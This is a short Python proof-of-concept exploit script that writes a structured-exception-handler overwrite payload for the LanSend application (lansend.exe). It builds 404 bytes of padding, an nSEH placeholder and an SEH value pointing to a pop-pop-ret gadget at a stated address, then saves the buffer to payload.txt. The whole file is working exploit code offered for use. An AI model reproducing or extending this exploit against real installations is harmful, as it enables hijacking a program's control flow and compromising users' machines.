#!/usr/bin/python

f = file('payload.txt','w')

nSeh = "B" * 4
Seh  = "\x4c\x7b\x41" # 0x00417b4c : pop ecx # pop ebp # ret 0x04 - C:\Users\Exp\AppData\Local\Programs\LizardSystems\LanSend\lansend.exe

payload  = "A" * 404
payload += nSeh
payload += Seh
#payload += "D" * (2000 - len(payload))

f.write(payload)
f.close()

